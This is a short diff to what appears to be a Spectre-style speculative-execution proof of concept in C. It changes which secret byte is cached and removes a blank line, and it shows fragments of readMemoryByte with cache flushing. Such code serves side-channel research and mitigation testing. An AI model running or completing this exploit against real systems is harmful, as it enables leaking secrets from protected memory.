@@ -98,7 +98,7 @@ void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2], int resu
     training_x = tries % array1_size;
 
     // Load the secret into cache for fast access
-    printf("%c", secret[0]);
+    printf("%c", secret[1]);
 
     for (j = N_VICTIM; j >= 0; j--) {
       _mm_clflush( & array1_size);
@@ -201,4 +201,3 @@ int main(int argc,
 
   return (0);
 }
-
